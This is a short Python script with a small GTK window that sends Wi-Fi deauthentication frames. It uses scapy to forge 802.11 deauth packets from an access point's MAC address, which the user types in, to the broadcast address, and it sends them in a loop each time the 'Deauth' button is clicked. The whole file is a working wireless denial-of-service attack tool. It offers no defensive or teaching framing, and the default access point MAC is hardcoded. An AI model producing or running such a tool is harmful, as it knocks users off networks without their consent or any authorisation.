#!/usr/bin/python
import sys
from scapy.all import *
from gi.repository import Gtk

client = 'FF:FF:FF:FF:FF:FF'

class MainWindow(Gtk.Window):

	def __init__(self):
		Gtk.Window.__init__(self,title="Send Deauths")
		self.set_border_width(20)
		self.set_size_request(200,100)

		#layout
		vbox=Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
		self.add(vbox)

		#username
		self.username=Gtk.Entry()
		self.username.set_text("5C:2E:59:88:C2:D9")
		vbox.pack_start(self.username,True,True,0)


		#deauth
		self.button=Gtk.Button(label="Deauth")
		self.button.connect("clicked",self.deauth)
		vbox.pack_start(self.button,True,True,0)
		

	
		
	def deauth(self,widget):
		mac_address=self.username.get_text()
		count=10
		pckt = Dot11(addr1=client, addr2=mac_address, addr3=mac_address) / Dot11Deauth()
	
		while count != 0:
			try:
				for i in range(10):
					# Send out deauth from the AP
					send(pckt)
					
				# If count was -1, this will be an infinite loop
				count -= 1
			except KeyboardInterrupt:
				break
		
		





window = MainWindow()
window.connect("delete-event",Gtk.main_quit)
window.show_all()
Gtk.main()
